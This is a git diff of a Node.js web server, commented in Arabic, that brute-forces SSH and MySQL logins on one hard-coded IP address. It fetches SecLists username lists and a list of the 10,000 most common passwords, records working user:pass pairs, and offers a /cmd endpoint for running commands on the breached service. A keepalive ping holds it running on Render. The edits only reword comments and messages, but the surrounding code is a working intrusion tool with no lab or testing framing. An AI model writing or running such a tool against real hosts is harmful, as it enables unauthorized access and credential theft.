@@ -8,20 +8,20 @@ const port = process.env.PORT || 10000;
 let logs = [];
 let connectedService = null;
 let connectionResult = null;
-let credentials = []; // username + password list
+let credentials = []; // قائمة user:pass
 
 const targetIP = '185.182.193.132';
 
-// روابط لليوزر نيمز والباسوردات
-const usernameListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt';
+// روابط لقوائم اليوزر والباسورد
+const usernameListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames.txt';
 const passwordListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
 
-// Ping للحفاظ على تشغيل السيرفر في Render
+// Ping لمنع توقف السيرفر على Render
 setInterval(() => {
   fetch(`https://noon-9v11.onrender.com/`).catch(() => {});
 }, 60_000);
 
-// تحميل بيانات من GitHub
+// تحميل القوائم
 async function loadCredentials() {
   const users = await fetch(usernameListURL).then(res => res.text());
   const passes = await fetch(passwordListURL).then(res => res.text());
@@ -68,7 +68,7 @@ async function trySSH() {
         .on('ready', () => {
           connectedService = 'SSH';
           logs.push(`✅ SSH Connected - ${user}:${pass}`);
-          connectionResult = 'Connected via SSH - يمكنك الآن تنفيذ الأوامر من /cmd';
+          connectionResult = '✅ Connected via SSH - يمكنك الآن تنفيذ الأوامر من /cmd';
           conn.end();
           resolve();
         })
@@ -88,7 +88,7 @@ async function trySSH() {
   });
 }
 
-// واجهة عرض النتائج
+// واجهة المستخدم
 app.get('/', (req, res) => {
   res.send(`
     <html style="background:#000;color:#0f0;padding:20px;font-family:monospace">
@@ -106,7 +106,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// تنفيذ أوامر MySQL أو SSH
+// تنفيذ أوامر (لـ MySQL فقط حالياً)
 app.get('/cmd', async (req, res) => {
   const cmd = req.query.q || '';
   if (!connectedService) return res.send('❌ لم يتم الاتصال بأي خدمة بعد');
@@ -129,9 +129,10 @@ app.get('/cmd', async (req, res) => {
     }
   }
 
-  res.send('🔒 SSH أوامر لم تُفعل بعد - استخدم MySQL فقط الآن');
+  res.send('🔒 SSH: تنفيذ الأوامر غير مفعل بعد');
 });
 
+// تشغيل السيرفر
 app.listen(port, async () => {
   logs.push(`🚀 Running on port ${port}`);
   await loadCredentials();
